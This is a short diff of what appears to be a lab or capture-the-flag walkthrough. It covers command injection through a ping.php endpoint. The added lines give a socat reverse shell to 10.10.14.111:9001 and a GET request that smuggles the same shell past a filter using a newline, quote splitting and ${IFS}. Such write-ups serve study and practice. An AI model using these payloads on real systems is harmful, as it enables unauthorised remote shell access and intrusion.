@@ -458,7 +458,19 @@ echo $output;
 
 socat is not blacklisted:
 
-![](./vhosts/monitoring/monitoring6.png)
+![](./vhosts/monitoring/monitoring7.png)
+
+
+a socat reverse shell is then used and adapted to evade the filters:
+
+```
+socat TCP:10.10.14.111:9001 EXEC:bash
+```
+
+```
+GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
+```
+
 
 ```
 
